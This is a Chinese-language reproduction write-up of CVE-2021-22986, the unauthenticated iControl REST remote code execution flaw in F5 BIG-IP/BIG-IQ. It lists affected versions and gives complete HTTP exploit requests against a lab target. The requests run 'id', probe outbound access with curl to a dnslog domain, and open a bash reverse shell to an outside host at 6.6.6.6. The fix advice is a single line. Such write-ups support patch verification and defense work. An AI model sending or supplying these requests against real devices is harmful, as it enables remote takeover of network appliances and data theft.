# 0x00漏洞简述

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。

2021 年3月10日，F5官方发布安全通告，安全更新包含了影响F5的BIG-IP，BIG-IQ设备的多个高危漏洞，漏洞编号分别为CVE-2021-22986，CVE-2021-22987，CVE-2021-22988，CVE-2021-22989，CVE-2021-22990，CVE-2021-22991，CVE-2021-22992；其中CVE-2021-22986为F5
BIG-IP/IQ设备 iControl REST接口的未授权远程代码执行漏洞，漏洞评分9.8，评级严重。F5安全公告更新了BIG-IP，BIG-IQ中的多个严重漏洞。建议广大用户及时将f5 big-iq,f5 big-ip升级到最新版本，避免遭到攻击。

# 0x01影响版本

BIG-IP 16.0.0-16.0.1  
BIG-IP 15.1.0-15.1.2  
BIG-IP 14.1.0-14.1.3.1  
BIG-IP 13.1.0-13.1.3.5  
BIG-IP 12.1.0-12.1.5.2  
BIG-IQ 7.1.0-7.1.0.2  
BIG-IQ 7.0.0-7.0.0.1  
BIG-IQ 6.0.0-6.1.0

# 0x02漏洞复现

部署安装F5 BIG-IPV漏洞测试靶场环境。

1、访问漏洞环境

![1616287103_6056957fe81573d247e75.png!small](https://image.3001.net/images/20210321/1616287103_6056957fe81573d247e75.png!small)

2、POC验证，进行命令执行操作

1.系统命令执行

POST /mgmt/tm/util/bash HTTP/1.1

Host: 192.168.3.112

Connection: close

Content-Length: 41

Cache-Control: max-age=0

Authorization: Basic YWRtaW46QVNhc1M=

X-F5-Auth-Token:

Upgrade-Insecure-Requests: 1

Content-Type: application/json

{"command":"run","utilCmdArgs":"-c id"}

![1616287166_605695be21533f4ce0d6b.png!small](https://image.3001.net/images/20210321/1616287166_605695be21533f4ce0d6b.png!small)

2.通过dnslog探测是否可以出网

生成域名：zg8ie5.dnslog.cn

![1616287178_605695ca5c6dd02b4e45a.png!small](https://image.3001.net/images/20210321/1616287178_605695ca5c6dd02b4e45a.png!small)

出网探测

 **POST /mgmt/tm/util/bash HTTP/1.1**

 **Host: 192.168.3.112**

 **Connection: close**

 **Content-Length: 62**

 **Cache-Control: max-age=0**

 **Authorization: Basic YWRtaW46QVNhc1M=**

 **X-F5-Auth-Token:**

 **Upgrade-Insecure-Requests: 1**

 **Content-Type: application/json**

 ****

 **{"command":"run","utilCmdArgs":"-c 'curl zg8ie5.dnslog.cn'"}**

![1616287193_605695d90f2d646434e09.png!small](https://image.3001.net/images/20210321/1616287193_605695d90f2d646434e09.png!small)

发现可以出网

![1616287202_605695e2e6b9a251780a2.png!small](https://image.3001.net/images/20210321/1616287202_605695e2e6b9a251780a2.png!small)

3.通过bash反弹shell到vps

POST /mgmt/tm/util/bash HTTP/1.1

Host: 192.168.3.112

Connection: close

Content-Length: 83

Cache-Control: max-age=0

Authorization: Basic YWRtaW46QVNhc1M=

X-F5-Auth-Token:

Upgrade-Insecure-Requests: 1

Content-Type: application/json

{"command":"run","utilCmdArgs":"-c 'bash -i >&/dev/tcp/6.6.6.6/12377 0>&1'"}

![1616287216_605695f0eb2d6a80bd85d.png!small](https://image.3001.net/images/20210321/1616287216_605695f0eb2d6a80bd85d.png!small)

漏洞验证python脚本​

https://github.com/PeiQi0/PeiQi-WIKI-POC

# 0x03修复建议

升级到最新版本

# 0x04参考链接

https://mp.weixin.qq.com/s/ZtE7R4PPgdWY9ea06A9wqQ

https://mp.weixin.qq.com/s/lyrVwgSnu0iSehVr3lZiRw

